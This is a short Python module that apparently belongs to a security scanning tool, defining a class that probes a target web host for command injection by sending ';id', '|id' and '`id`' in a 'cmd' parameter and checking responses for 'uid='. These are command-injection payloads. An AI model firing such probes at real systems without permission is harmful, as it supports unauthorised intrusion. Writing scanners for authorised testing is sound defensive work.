import requests
from config import HTTP_HEADERS, DEFAULT_TIMEOUT

class RCEScanner:
    def __init__(self):
        self.payloads = [";id", "|id", "`id`"]

    def scan(self, target):
        results = []
        for payload in self.payloads:
            try:
                url = f"http://{target}/?cmd={payload}"
                response = requests.get(url, headers=HTTP_HEADERS, timeout=DEFAULT_TIMEOUT)
                if "uid=" in response.text:
                    results.append({"vulnerable": True, "payload": url})
            except Exception as e:
                results.append({"error": str(e)})
        return results if results else [{"vulnerable": False}]

def scan(args=None):
    return RCEScanner().scan(args.target)
